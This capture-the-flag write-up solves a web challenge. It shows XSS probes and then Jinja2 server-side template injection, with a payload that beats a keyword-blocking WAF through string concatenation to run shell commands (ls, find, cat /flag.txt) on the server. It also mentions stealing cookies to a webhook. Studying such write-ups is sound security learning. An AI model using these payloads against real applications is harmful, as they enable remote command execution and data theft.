# [Web] Search and Destroy - SSTI Exploitation

**Category:** Web Exploitation
**Points:** 500
**Description** Are you better at attacking or defending?

**Base URL:** `https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu`

## Solution

### Step 1: Initial Attempts - XSS Testing

First, I tried to exploit potential XSS vulnerabilities by testing various payloads in the `score` parameter:

```
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score=<script>alert(1)</script>
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score=<img src=x onerror=alert(1)>
```

However, all XSS work I try grabing the cookie and send it to my webhook this work but no data where to be found

### Step 2: Template Injection Discovery

Since XSS didn't work, I tested for Server-Side Template Injection (SSTI) with a simple math expression:

```
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score={{7*7}}
```

The application returned `49` instead of the literal string `{{7*7}}`, confirming that SSTI exists! The application is using a template engine (Jinja2) to render user input.

### Step 3: Bypassing the WAF

The application has a WAF that blocks common SSTI keywords. After testing various payloads, I discovered the WAF blocks:

- `__globals__`
- `__init__`
- `popen`
- `read`

**The bypass technique:** Use string concatenation to split blocked keywords:

```python
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score={{lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('ls')['re'+'ad']()}}
```

### Step 4: Finding the Flag

With RCE achieved, I searched for the flag file:

```python
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score={{lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('find / -name "*flag*" 2>/dev/null')['re'+'ad']()}}
```

The flag was located at `/flag.txt`

### Step 5: Reading the Flag

Final payload to read `/flag.txt`:

```python
https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu?score={{lipsum['__glob'+'als__']['o'+'s']['pop'+'en']('cat /flag.txt')['re'+'ad']()}}
```

**Flag:** `CSC26{546bc79c4ca82e93733894b8d7151285763e830ebf5b5a9238795e7fb24dea55}`
